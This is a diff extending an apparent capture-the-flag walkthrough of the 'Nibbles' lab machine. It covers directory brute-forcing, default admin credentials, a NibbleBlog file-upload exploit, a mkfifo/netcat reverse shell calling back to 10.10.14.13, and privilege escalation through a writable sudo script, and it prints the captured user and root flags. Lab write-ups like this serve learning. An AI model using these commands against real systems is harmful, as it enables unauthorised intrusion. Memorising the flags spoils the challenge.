@@ -27,3 +27,52 @@ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/directory
 /update.php           (Status: 200)                                          
 /README               (Status: 200)                                            
 /languages            (Status: 301)
+
+We visit the site nibbleblog and append admin.php, here we are greeted with a login page. We try several combinations and admin : nibbles works.
+Searching around for a nibbleblog exploit we come across the article : https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
+
+We proceed with the steps on the article :
+
+1. Login to the compromised site
+2. Go to images plugins and upload a reverse shell : http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
+3. Listen with nc on our attacking machine
+4. Visit the default upload url on the victim machine : http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+And we get a reverse shell and access to user flag!
+nibbler@Nibbles:/home/nibbler$ cat user.txt
+cat user.txt
+773548e2145bf9ed777abe89a930560b
+===============Priv Escalation====================
+nibbler@Nibbles:/home/nibbler$ sudo -l
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+    
+Write a simple reverse shell, start a simple server and upload shell on victim's server:
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 1234 >/tmp/f
+
+python3 -m http.server
+wget http://10.10.14.13:8000/monitor.sh
+chmod +x monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh OR sudo ./monitor.sh
+Reverse shell here:
+Ncat: Connection from 10.10.10.75:44798.
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@Nibbles:/home/nibbler/personal/stuff# cd /root
+cd /root
+root@Nibbles:~# ls
+ls
+root.txt
+root@Nibbles:~# cat root.txt
+cat root.txt
+bc6c0b710e715d9568983118f307e448
+    ==============Root user pawned! Bye =====================
